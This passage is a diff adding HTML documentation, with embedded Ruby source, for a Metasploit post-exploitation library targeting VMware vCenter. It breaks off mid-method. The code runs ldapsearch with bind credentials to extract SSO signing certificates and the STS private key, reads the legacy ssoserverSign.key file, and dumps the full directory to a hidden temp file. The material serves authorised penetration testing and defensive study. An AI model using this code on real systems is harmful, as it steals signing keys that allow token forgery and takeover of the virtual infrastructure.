+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ldapsearch_bin'>ldapsearch_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> -h </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vc_psc_fqdn'>vc_psc_fqdn</span><span class='embexpr_end'>}</span><span class='tstring_content'> -LLL -p 389 -b \&quot;cn=</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_base_fqdn'>base_fqdn</span><span class='embexpr_end'>}</span><span class='tstring_content'>,cn=Tenants,cn=IdentityManager,cn=Services,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_base_dn'>base_dn</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot; -D \&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_bind_dn'>bind_dn</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot; -w </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_shell_bind_pw'>shell_bind_pw</span><span class='embexpr_end'>}</span><span class='tstring_content'> \&quot;(objectclass=vmwSTSTenantCredential)\&quot; userCertificate</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='id identifier rubyid_output'>output</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_cert_output'>cert_output</span> <span class='op'>=</span> <span class='kw'>false</span>
+  <span class='id identifier rubyid_output'>output</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_line'>line</span><span class='op'>|</span>
+    <span class='comment'># skip anything until we get to content
+</span>    <span class='kw'>next</span> <span class='kw'>unless</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>||</span> <span class='id identifier rubyid_cert_output'>cert_output</span>
+
+    <span class='comment'># aka our first key
+</span>    <span class='kw'>if</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_cert_output'>cert_output</span> <span class='comment'># first cert
+</span>      <span class='id identifier rubyid_cert_output'>cert_output</span> <span class='op'>=</span> <span class='kw'>true</span>
+    <span class='kw'>elsif</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_cert_output'>cert_output</span> <span class='comment'># our n+1 cert
+</span>      <span class='id identifier rubyid_cert'>cert</span> <span class='op'>=</span> <span class='id identifier rubyid_validate_x509_cert'>validate_x509_cert</span><span class='lparen'>(</span><span class='id identifier rubyid_cert_contents'>cert_contents</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_all_certs'>all_certs</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_cert'>cert</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+      <span class='id identifier rubyid_cert_contents'>cert_contents</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_line'>line</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_cert_contents'>cert_contents</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_cert_output'>cert_output</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_cert'>cert</span> <span class='op'>=</span> <span class='id identifier rubyid_validate_x509_cert'>validate_x509_cert</span><span class='lparen'>(</span><span class='id identifier rubyid_cert_contents'>cert_contents</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_all_certs'>all_certs</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_cert'>cert</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_all_certs'>all_certs</span> <span class='kw'>unless</span> <span class='id identifier rubyid_all_certs'>all_certs</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+
+  <span class='comment'># now we try the legacy approach since that failed
+</span>  <span class='id identifier rubyid_print_warning'>print_warning</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>userCertificate was not found in vmdir, checking for legacy ssoserverSign cert PEM files...</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_legacy_cert_file'>legacy_cert_file</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_cert_contents'>cert_contents</span> <span class='op'>=</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_legacy_cert_file'>legacy_cert_file</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_cert'>cert</span> <span class='op'>=</span> <span class='id identifier rubyid_validate_x509_cert'>validate_x509_cert</span><span class='lparen'>(</span><span class='id identifier rubyid_cert_contents'>cert_contents</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='lbracket'>[</span><span class='id identifier rubyid_cert'>cert</span><span class='rbracket'>]</span> <span class='kw'>unless</span> <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+  <span class='kw'>nil</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_idp_keys-instance_method">
+  
+    #<strong>get_idp_keys</strong>(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)  &#x21d2; <tt>Array</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Retrieves the IDP private key</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>base_fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>fully qualified domain name of the virtual center</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>vc_psc_fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>fully qualified domain name of the virtual center</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>base_dn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the base dn to search in ldap</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>bind_dn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the base dn to use</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>shell_bind_pw</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the password for the bind dn</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Array</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the private key (PKey), nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+425
+426
+427
+428
+429
+430
+431
+432
+433
+434
+435
+436
+437
+438
+439
+440
+441
+442
+443
+444
+445
+446
+447
+448
+449
+450
+451
+452
+453
+454
+455
+456
+457
+458
+459
+460
+461
+462
+463</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 425</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_idp_keys'>get_idp_keys</span><span class='lparen'>(</span><span class='id identifier rubyid_base_fqdn'>base_fqdn</span><span class='comma'>,</span> <span class='id identifier rubyid_vc_psc_fqdn'>vc_psc_fqdn</span><span class='comma'>,</span> <span class='id identifier rubyid_base_dn'>base_dn</span><span class='comma'>,</span> <span class='id identifier rubyid_bind_dn'>bind_dn</span><span class='comma'>,</span> <span class='id identifier rubyid_shell_bind_pw'>shell_bind_pw</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span> <span class='id identifier rubyid_ldapsearch_bin'>ldapsearch_bin</span>
+
+  <span class='id identifier rubyid_header'>header</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>vmwSTSPrivateKey:: </span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_legacy_key_file'>legacy_key_file</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/vmware-sso/keys/ssoserverSign.key</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_all_keys'>all_keys</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_key_contents'>key_contents</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ldapsearch_bin'>ldapsearch_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> -h </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vc_psc_fqdn'>vc_psc_fqdn</span><span class='embexpr_end'>}</span><span class='tstring_content'> -LLL -p 389 -b \&quot;cn=</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_base_fqdn'>base_fqdn</span><span class='embexpr_end'>}</span><span class='tstring_content'>,cn=Tenants,cn=IdentityManager,cn=Services,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_base_dn'>base_dn</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot; -D \&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_bind_dn'>bind_dn</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot; -w </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_shell_bind_pw'>shell_bind_pw</span><span class='embexpr_end'>}</span><span class='tstring_content'> \&quot;(objectclass=vmwSTSTenantCredential)\&quot; vmwSTSPrivateKey</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='id identifier rubyid_output'>output</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key_output'>key_output</span> <span class='op'>=</span> <span class='kw'>false</span>
+  <span class='id identifier rubyid_output'>output</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_line'>line</span><span class='op'>|</span>
+    <span class='comment'># skip anything until we get to content
+</span>    <span class='kw'>next</span> <span class='kw'>unless</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>||</span> <span class='id identifier rubyid_key_output'>key_output</span>
+
+    <span class='comment'># aka our first key
+</span>    <span class='kw'>if</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_key_output'>key_output</span> <span class='comment'># first key
+</span>      <span class='id identifier rubyid_key_output'>key_output</span> <span class='op'>=</span> <span class='kw'>true</span>
+    <span class='kw'>elsif</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_key_output'>key_output</span> <span class='comment'># our n+1 key
+</span>      <span class='id identifier rubyid_pkey'>pkey</span> <span class='op'>=</span> <span class='id identifier rubyid_validate_pkey'>validate_pkey</span><span class='lparen'>(</span><span class='id identifier rubyid_key_contents'>key_contents</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_pkey'>pkey</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_pkey'>pkey</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+      <span class='id identifier rubyid_key_contents'>key_contents</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_line'>line</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_key_contents'>key_contents</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_key_output'>key_output</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_pkey'>pkey</span> <span class='op'>=</span> <span class='id identifier rubyid_validate_pkey'>validate_pkey</span><span class='lparen'>(</span><span class='id identifier rubyid_key_contents'>key_contents</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_pkey'>pkey</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_pkey'>pkey</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_all_keys'>all_keys</span> <span class='kw'>unless</span> <span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+
+  <span class='comment'># now we try the legacy approach since that failed
+</span>  <span class='id identifier rubyid_print_warning'>print_warning</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>vmwSTSPrivateKey was not found in vmdir, checking for legacy ssoserverSign key PEM files...</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_legacy_key_file'>legacy_key_file</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_key_contents'>key_contents</span> <span class='op'>=</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_legacy_key_file'>legacy_key_file</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_validate_pkey'>validate_pkey</span><span class='lparen'>(</span><span class='id identifier rubyid_key_contents'>key_contents</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='lbracket'>[</span><span class='id identifier rubyid_key'>key</span><span class='rbracket'>]</span> <span class='kw'>unless</span> <span class='id identifier rubyid_key'>key</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+  <span class='kw'>nil</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_ipv4-instance_method">
+  
+    #<strong>get_ipv4</strong>(interface = &#39;eth0&#39;)  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>It returns the IPv4 address of an interface.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the host IPv4 interface</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 179</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_ipv4'>get_ipv4</span><span class='lparen'>(</span><span class='id identifier rubyid_interface'>interface</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>eth0</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='comment'># we make an assumption ifconfig exists, this may fail in the future
+</span>  <span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>ifconfig | grep </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_interface'>interface</span><span class='embexpr_end'>}</span><span class='tstring_content'> -A1 | grep \&quot;inet addr:\&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>if</span> <span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+  <span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span> <span class='op'>=</span> <span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>  </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='comment'># splits to inet addr, bcast, mask
+</span>  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>if</span> <span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+  <span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span> <span class='op'>=</span> <span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>:</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Socket</span><span class='period'>.</span><span class='id identifier rubyid_is_ipv4?'>is_ipv4?</span><span class='lparen'>(</span><span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_vsphere_machine_ipv4'>vsphere_machine_ipv4</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_ldif_contents-instance_method">
+  
+    #<strong>get_ldif_contents</strong>(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the LDF file contents from the remote system TODO: Make this less jank. LDIF data is too big to put in a string, the</p>
+
+<pre class="code ruby"><code class="ruby">only way to get a complete copy is to write it to the filesystem
+on the appliance first and copy it to our local machine for
+processing. This is slow and inefficient and there is probably a
+much better way. I would also love to lose the ARTIFACTS_ON_DISK
+side effect.
+</code></pre>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>base_fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>fully qualified domain name of the virtual center</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>vc_psc_fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>fully qualified domain name of the virtual center</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>base_dn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the base dn to search in ldap</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>bind_dn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the base dn to use</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>shell_bind_pw</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the password for the bind dn</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the LDF contents. nil if not found.</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 264</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_ldif_contents'>get_ldif_contents</span><span class='lparen'>(</span><span class='id identifier rubyid_base_fqdn'>base_fqdn</span><span class='comma'>,</span> <span class='id identifier rubyid_vc_psc_fqdn'>vc_psc_fqdn</span><span class='comma'>,</span> <span class='id identifier rubyid_base_dn'>base_dn</span><span class='comma'>,</span> <span class='id identifier rubyid_bind_dn'>bind_dn</span><span class='comma'>,</span> <span class='id identifier rubyid_shell_bind_pw'>shell_bind_pw</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/tmp/.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_base_fqdn'>base_fqdn</span><span class='embexpr_end'>}</span><span class='tstring_content'>_</span><span class='embexpr_beg'>#{</span><span class='const'>Time</span><span class='period'>.</span><span class='id identifier rubyid_now'>now</span><span class='period'>.</span><span class='id identifier rubyid_strftime'>strftime</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>%Y%m%d%H%M%S</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>.tmp</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_rm_f'>rm_f</span><span class='lparen'>(</span><span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_out'>out</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ldapsearch_bin'>ldapsearch_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> -h </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vc_psc_fqdn'>vc_psc_fqdn</span><span class='embexpr_end'>}</span><span class='tstring_content'> -b &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_base_dn'>base_dn</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39; -s sub -D &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_bind_dn'>bind_dn</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39; -w </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_shell_bind_pw'>shell_bind_pw</span><span class='embexpr_end'>}</span><span class='tstring_content'> \\* \\+ \\- \&gt; </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_contents'>contents</span> <span class='op'>=</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_contents'>contents</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+    <span class='id identifier rubyid_print_warning'>print_warning</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Unable to retrieve ldif contents</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_rm_f'>rm_f</span><span class='lparen'>(</span><span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_vprint_good'>vprint_good</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Removed temporary file from vCenter appliance: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>else</span>
